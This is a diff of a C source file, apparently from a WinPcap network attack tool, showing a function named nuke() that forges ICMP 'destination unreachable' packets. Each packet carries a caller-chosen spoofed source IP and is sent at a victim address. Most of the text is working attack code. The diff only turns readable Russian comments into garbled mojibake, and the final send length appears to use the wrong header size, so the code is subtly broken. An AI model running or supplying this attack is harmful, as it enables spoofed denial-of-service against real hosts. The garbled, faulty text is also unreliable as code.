@@ -1,4 +1,4 @@
-#define WPCAP
+п»ї#define WPCAP
 #define HAVE_REMOTE
 
 #include <pcap.h>
@@ -13,30 +13,30 @@ extern pcap_t* select_device();
 extern WORD checksum(WORD *buffer, DWORD size);
 
 /******************************************************************************/
-//  Функция, осуществляющая атаку Nuke.
+//  Р¤СѓРЅРєС†РёСЏ, РѕСЃСѓС‰РµСЃС‚РІР»СЏСЋС‰Р°СЏ Р°С‚Р°РєСѓ Nuke.
 //
-//  Входные параметры:
-//      char *victim_ip_address - IP адресс жертвы.
-//      char *source_ip_address - IP адресс отправителя.
-//  Выходные параметры:
-//      int - возвращаемое значение.
-//          '0' - Все в порядке.
-//          '-1' - Возникли некоторые ошибки.
+//  Р’С…РѕРґРЅС‹Рµ РїР°СЂР°РјРµС‚СЂС‹:
+//      char *victim_ip_address - IP Р°РґСЂРµСЃСЃ Р¶РµСЂС‚РІС‹.
+//      char *source_ip_address - IP Р°РґСЂРµСЃСЃ РѕС‚РїСЂР°РІРёС‚РµР»СЏ.
+//  Р’С‹С…РѕРґРЅС‹Рµ РїР°СЂР°РјРµС‚СЂС‹:
+//      int - РІРѕР·РІСЂР°С‰Р°РµРјРѕРµ Р·РЅР°С‡РµРЅРёРµ.
+//          '0' - Р’СЃРµ РІ РїРѕСЂСЏРґРєРµ.
+//          '-1' - Р’РѕР·РЅРёРєР»Рё РЅРµРєРѕС‚РѕСЂС‹Рµ РѕС€РёР±РєРё.
 /******************************************************************************/
 int nuke(char *victim_ip_address, char *source_ip_address)
 {
-    struct ethernet_header ethernet;    // Ethernet заголовок.
-    struct ip_header ip;                // IP заголовок.
-    struct icmp_header icmp;            // ICMP заголовок.
+    struct ethernet_header ethernet;    // Ethernet Р·Р°РіРѕР»РѕРІРѕРє.
+    struct ip_header ip;                // IP Р·Р°РіРѕР»РѕРІРѕРє.
+    struct icmp_header icmp;            // ICMP Р·Р°РіРѕР»РѕРІРѕРє.
 
-    pcap_t *device_handle;              // Открытое устройство для приема/передачи данных.
+    pcap_t *device_handle;              // РћС‚РєСЂС‹С‚РѕРµ СѓСЃС‚СЂРѕР№СЃС‚РІРѕ РґР»СЏ РїСЂРёРµРјР°/РїРµСЂРµРґР°С‡Рё РґР°РЅРЅС‹С….
 
-    char data[33] = {"abcdefghijklmnopqrstuvwabcdefghi"};   // Отправляемые данные.
-    char packet[65536] = {0};                               // Отправляемый пакет.
-    char temp_buffer[65535] = {0};                          // Временный буффер.
+    char data[33] = {"abcdefghijklmnopqrstuvwabcdefghi"};   // РћС‚РїСЂР°РІР»СЏРµРјС‹Рµ РґР°РЅРЅС‹Рµ.
+    char packet[65536] = {0};                               // РћС‚РїСЂР°РІР»СЏРµРјС‹Р№ РїР°РєРµС‚.
+    char temp_buffer[65535] = {0};                          // Р’СЂРµРјРµРЅРЅС‹Р№ Р±СѓС„С„РµСЂ.
 
     device_handle = select_device();
-    // Заполнение Ethernet заголовка.
+    // Р—Р°РїРѕР»РЅРµРЅРёРµ Ethernet Р·Р°РіРѕР»РѕРІРєР°.
     ethernet.source_mac_address[0] = 0x00;
     ethernet.source_mac_address[1] = 0x00;
     ethernet.source_mac_address[2] = 0x00;
@@ -50,44 +50,44 @@ int nuke(char *victim_ip_address, char *source_ip_address)
     ethernet.destination_mac_address[4] = 0xff;
     ethernet.destination_mac_address[5] = 0xff;
     ethernet.type = htons(ETHERNET_TYPE_IP);
-    // Формирование пакета.
+    // Р¤РѕСЂРјРёСЂРѕРІР°РЅРёРµ РїР°РєРµС‚Р°.
     memcpy(packet, &ethernet, sizeof(ethernet_header));
-    // Заолнение IP заголовка.
-    ip.version = 4;                                             // Версия протокола IPv4.
-    ip.header_length = 5;                                       // Длинна IP заголовка.
-    ip.type_of_service = 0;                                     // Тип обслуживания.
+    // Р—Р°РѕР»РЅРµРЅРёРµ IP Р·Р°РіРѕР»РѕРІРєР°.
+    ip.version = 4;                                             // Р’РµСЂСЃРёСЏ РїСЂРѕС‚РѕРєРѕР»Р° IPv4.
+    ip.header_length = 5;                                       // Р”Р»РёРЅРЅР° IP Р·Р°РіРѕР»РѕРІРєР°.
+    ip.type_of_service = 0;                                     // РўРёРї РѕР±СЃР»СѓР¶РёРІР°РЅРёСЏ.
     ip.total_length = htons(sizeof(ip_header) +
                             sizeof(icmp_header) +
-                            sizeof(data));                      // Длинна = IP заголовок + ICMP заголовок + данные.
-    ip.identification = 0;                                      // Идентификатор.
-    ip.flags_fragmentation_offset = 0;                          // Флаги фрагментации и смещение.
-    ip.time_to_live = 255;                                      // Возможное количество пройденных маршрутизаторов.
-    ip.protocol = IPPROTO_ICMP;                                 // Протокол следующего уровня.
-    ip.destination_ip_address = inet_addr(victim_ip_address);   // IP адрес получателя.
-    ip.source_ip_address = inet_addr(source_ip_address);        // IP адрес отправителя.
-    ip.header_checksum = 0;                                     // Контрольная сумма IP заголовка.
-    // Вычисление контрольной суммы IP заголовка.
+                            sizeof(data));                      // Р”Р»РёРЅРЅР° = IP Р·Р°РіРѕР»РѕРІРѕРє + ICMP Р·Р°РіРѕР»РѕРІРѕРє + РґР°РЅРЅС‹Рµ.
+    ip.identification = 0;                                      // РРґРµРЅС‚РёС„РёРєР°С‚РѕСЂ.
+    ip.flags_fragmentation_offset = 0;                          // Р¤Р»Р°РіРё С„СЂР°РіРјРµРЅС‚Р°С†РёРё Рё СЃРјРµС‰РµРЅРёРµ.
+    ip.time_to_live = 255;                                      // Р’РѕР·РјРѕР¶РЅРѕРµ РєРѕР»РёС‡РµСЃС‚РІРѕ РїСЂРѕР№РґРµРЅРЅС‹С… РјР°СЂС€СЂСѓС‚РёР·Р°С‚РѕСЂРѕРІ.
+    ip.protocol = IPPROTO_ICMP;                                 // РџСЂРѕС‚РѕРєРѕР» СЃР»РµРґСѓСЋС‰РµРіРѕ СѓСЂРѕРІРЅСЏ.
+    ip.destination_ip_address = inet_addr(victim_ip_address);   // IP Р°РґСЂРµСЃ РїРѕР»СѓС‡Р°С‚РµР»СЏ.
+    ip.source_ip_address = inet_addr(source_ip_address);        // IP Р°РґСЂРµСЃ РѕС‚РїСЂР°РІРёС‚РµР»СЏ.
+    ip.header_checksum = 0;                                     // РљРѕРЅС‚СЂРѕР»СЊРЅР°СЏ СЃСѓРјРјР° IP Р·Р°РіРѕР»РѕРІРєР°.
+    // Р’С‹С‡РёСЃР»РµРЅРёРµ РєРѕРЅС‚СЂРѕР»СЊРЅРѕР№ СЃСѓРјРјС‹ IP Р·Р°РіРѕР»РѕРІРєР°.
     ip.header_checksum = checksum((WORD*)&ip, sizeof(ip_header));
-    // Формирование пакета.
+    // Р¤РѕСЂРјРёСЂРѕРІР°РЅРёРµ РїР°РєРµС‚Р°.
     memcpy((packet + sizeof(ethernet_header)), &ip, sizeof(ip_header));
-    // Заполнение ICMP заголовка.
-    icmp.type = ICMP_TYPE_DESTINATION_UNREACHABLE;      // Тип сообщения.
-    icmp.checksum = 0;                                  // Контрольная сума.
-    icmp.code = htons((rand() % 0xff));                 // Код ошибки.
-    icmp.identifier = htons((rand() % 0xffff));         // Идентификатор.
-    icmp.sequence_number = htons((rand() % 0xffff));    // Номер последовательности.
+    // Р—Р°РїРѕР»РЅРµРЅРёРµ ICMP Р·Р°РіРѕР»РѕРІРєР°.
+    icmp.type = ICMP_TYPE_DESTINATION_UNREACHABLE;      // РўРёРї СЃРѕРѕР±С‰РµРЅРёСЏ.
+    icmp.checksum = 0;                                  // РљРѕРЅС‚СЂРѕР»СЊРЅР°СЏ СЃСѓРјР°.
+    icmp.code = htons((rand() % 0xff));                 // РљРѕРґ РѕС€РёР±РєРё.
+    icmp.identifier = htons((rand() % 0xffff));         // РРґРµРЅС‚РёС„РёРєР°С‚РѕСЂ.
+    icmp.sequence_number = htons((rand() % 0xffff));    // РќРѕРјРµСЂ РїРѕСЃР»РµРґРѕРІР°С‚РµР»СЊРЅРѕСЃС‚Рё.
 
-    // Добавляем во временный буфер ICMP заголовок.
+    // Р”РѕР±Р°РІР»СЏРµРј РІРѕ РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ ICMP Р·Р°РіРѕР»РѕРІРѕРє.
     memcpy(temp_buffer, &icmp, sizeof(icmp_header));
-    // Добавляем во временный буфер данные.
+    // Р”РѕР±Р°РІР»СЏРµРј РІРѕ РІСЂРµРјРµРЅРЅС‹Р№ Р±СѓС„РµСЂ РґР°РЅРЅС‹Рµ.
     memcpy((temp_buffer + sizeof(icmp_header)), &data, sizeof(data));
-    // Вычисляем контрольную сумму ICMP заголовка.
+    // Р’С‹С‡РёСЃР»СЏРµРј РєРѕРЅС‚СЂРѕР»СЊРЅСѓСЋ СЃСѓРјРјСѓ ICMP Р·Р°РіРѕР»РѕРІРєР°.
     icmp.checksum = checksum((WORD*)&temp_buffer, (sizeof(icmp_header) + sizeof(data)));
-    // Формирование пакета.
+    // Р¤РѕСЂРјРёСЂРѕРІР°РЅРёРµ РїР°РєРµС‚Р°.
     memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header)), &icmp, sizeof(icmp_header));
     memcpy((packet + sizeof(ethernet_header) + sizeof(ip_header) + sizeof(icmp_header)), &data, sizeof(data));
 
-    // Отправляем пакет в сеть.
+    // РћС‚РїСЂР°РІР»СЏРµРј РїР°РєРµС‚ РІ СЃРµС‚СЊ.
     if (pcap_sendpacket(device_handle,
                         (u_char*)packet,
                         (sizeof(ethernet_header) + sizeof(ip_header) + sizeof(tcp_header) + sizeof(data))) != 0)
